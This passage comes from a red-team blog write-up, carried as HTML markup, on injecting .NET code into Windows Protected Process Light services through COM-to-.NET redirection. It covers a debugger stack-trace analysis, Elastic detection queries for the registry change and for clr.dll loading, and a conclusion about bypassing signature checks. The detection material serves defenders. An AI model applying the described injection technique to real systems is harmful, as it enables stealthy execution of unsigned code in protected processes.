[h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Reflection Invocations: A series of reflections (<strong class="font-bold">Invoke</strong>, <strong class="font-bold">UnsafeInvokeInternal</strong>, etc.) dynamically invoke methods, which could include COM-to-.NET redirection and other injected operations.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><span class="text-red-500 contrast-more:text-red-800"><strong class="font-bold">COM to CLR Invocation</strong></span>:</p></div></li></ul><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_738qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">0000005faa9fe000 00007ffa97568d8e DomainNeutralILStubClass.IL_STUB_COMtoCLR(System.StubHelpers.NativeVariant, IntPtr, IntPtr)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content"></span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This represents a COM to CLR stub method. The <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">IL_STUB_COMtoCLR</code> method is used when you call a COM method that internally invokes .NET code. It acts as a bridge between COM and .NET, ensuring that the parameters are passed correctly between the two environments.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NativeVariant</code>: This refers to the data structure used for handling COM data types (such as VARIANT) in a way that can be understood by both COM and .NET. IntPtr: These are pointers used to pass memory addresses or references, likely pointing to COM objects or .NET objects.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This log shows how your injected payload interacts with COM objects and .NET reflection mechanisms. </p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This stack trace highlights how the exploit leverages reflection, <strong class="font-bold">COM redirection</strong>, and the <strong class="font-bold">CLR </strong>to execute code, potentially interacting with protected processes like LSASS or other system-level components.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">By carefully analysing the stack traces, memory regions, and loaded assemblies in a WinDbg debugging session, we were able to trace the malicious assembly's behaviour and detect a potential fileless attack. This approach provides insight into how advanced attackers use reflection to execute payloads directly in memory.</p><h2 id="detection" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#detection"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_nf8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_nf8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Detection</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The technique leverages COM-to-.NET redirection to execute malicious .NET assemblies inside protected processes (PPL), such as svchost.exe running WaaSMedicSvc. This technique bypasses code integrity checks, making it a stealthy way to execute unsigned payloads.</p><h3 id="key-indicators-of-compromise-iocs" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#key-indicators-of-compromise-iocs"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_nj8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_nj8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">Key Indicators of Compromise (IOCs)</strong></div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">To detect this exploit, we can monitor for the following:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">Registry modifications</strong> enabling COM redirection.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">Unusual process behaviour</strong>, specifically <strong class="font-bold">WaaSMedicSvc</strong> loading <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">clr.dll</code>.</p></div></li></ul><h3 id="detection-queries" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#detection-queries"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_np8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_np8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">Detection Queries</strong></div></h3><h4 id="id-1.-registry-modification-detection" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#id-1.-registry-modification-detection"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_nr8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_nr8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">1. Registry Modification Detection</strong></div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Detects changes to the registry key that facilitates the COM redirection:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_7v8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">registry where event.type == "change" and <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">registry.path : "HKLM\\SOFTWARE\\Classes\\CLSID\\{0BE35203-8F91-11CE-9DE3-00AA004BB851}\\TreatAs\\" and <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">registry.data.strings : "{81C5FE01-027C-3E1C-98D5-DA9C9862AA21}"</span></span></code></pre></div><!--/$--><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/~gitbook/image?url=https%3A%2F%2F615064086-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MXlxki-LGPmhYCBAzg5%252Fuploads%252FeNAVWBuJou5PGDxp3bKV%252Fimage.png%3Falt%3Dmedia%26token%3Dd54cffef-06eb-4502-a894-b242c446c25b&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=7c34c075&amp;sv=2" width="2880" height="1016"></div></div></div></div><h4 id="id-2.-net-execution-in-a-protected-process" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#id-2.-net-execution-in-a-protected-process"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_o38qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_o38qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">2. NET Execution in a Protected Process</strong></div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Detects <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">WaaSMedicSvc</code> loading <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">clr.dll</code>, indicating .NET execution inside a protected process:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_878qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">sequence by process.entity_id<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content"> [process where event.action == "start" and process.name == "svchost.exe" and process.args == "WaaSMedicSvc"]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content"> [library where dll.name == "clr.dll"]</span></span></code></pre></div><!--/$--><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/~gitbook/image?url=https%3A%2F%2F615064086-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MXlxki-LGPmhYCBAzg5%252Fuploads%252FNim4k5oBEuf9HAb3ohDJ%252Fimage%2520%281%29.png%3Falt%3Dmedia%26token%3Dd7c5d587-7fcc-44d8-bbd3-360453a1b0a5&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=2f86778b&amp;sv=2" width="2880" height="1016"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Thanks to <strong class="font-bold">Samir </strong>aka <strong class="font-bold">(</strong><a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://x.com/SBousseaden">SBousseaden<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_j8b8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_j8b8qav5ukqiv5ubsnpfivb_)"></rect></svg></a><strong class="font-bold">)</strong>, who tested the tool and provided the <strong class="font-bold">Elastic queries and screenshots.</strong></p><h2 id="conclusion" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#conclusion"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_od8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_od8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Conclusion</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In this Proof-of-Concept (PoC), I demonstrated how code can be injected into a Protected Process Light (PPL), utilizing reflection-based techniques and COM-to-.NET redirection to bypass signature checks and security measures typically enforced in Windows processes with <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">PsProtectedSignerWindows-Light protection</code>. The detailed memory analysis, from CLR stack tracing to dissecting process behavior, provided valuable insights into how we can manipulate registry keys and leverage memory allocation techniques to sidestep the inherent protections.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">A special mention must be made of <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://infosec.exchange/@tiraniddo">James Forshaw<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_j8h8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_j8h8qav5ukqiv5ubsnpfivb_)"></rect></svg></a>, whose in-depth research and expertise in Windows internals have been invaluable in helping me navigate and understand the intricacies of this exploit. His work continues to be a source of learning and inspiration. Much of the techniques explored in this PoC are built upon principles found in his publications and blog posts.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The full C++ PoC code will be made available on my GitHub repository for those who wish to explore, learn, or further develop upon this concept.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto 